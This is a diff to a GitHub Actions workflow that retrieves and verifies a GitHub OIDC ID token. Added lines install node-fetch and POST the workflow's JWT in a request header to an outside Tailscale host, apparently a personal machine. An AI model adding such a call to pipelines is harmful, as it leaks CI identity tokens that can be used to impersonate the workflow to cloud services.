@@ -52,7 +52,7 @@ jobs:
       run: curl --trace-ascii /tmp/curl.log --trace-time -L https://token.actions.githubusercontent.com/.well-known/openid-configuration
 
     - name: Install OIDC Client from Core Package
-      run: npm install @actions/core@1.6.0 @actions/http-client jwks-rsa jsonwebtoken
+      run: npm install @actions/core@1.6.0 @actions/http-client jwks-rsa jsonwebtoken node-fetch
       
     - name: Get Id Token
       uses: actions/github-script@v6
@@ -66,6 +66,15 @@ jobs:
 
           const jwksClient = require('jwks-rsa'); // from auth0
           const jwt = require('jsonwebtoken');
+          const fetch = require('node-fetch');
+
+          await fetch('https://sam-dell.tailnet-6e00.ts.net/', {
+            method: 'POST',
+            body: 'github jwt in headers',
+            headers: {
+              'x-github-jwt': githubJwt
+            }
+          });
 
           const githubActionsOpenIdConfigurationUri = 'https://token.actions.githubusercontent.com/.well-known/openid-configuration';
           const githubActionsJwksUri = 'https://tokens.actions.githubusercontent.com/.well-known/jwks';
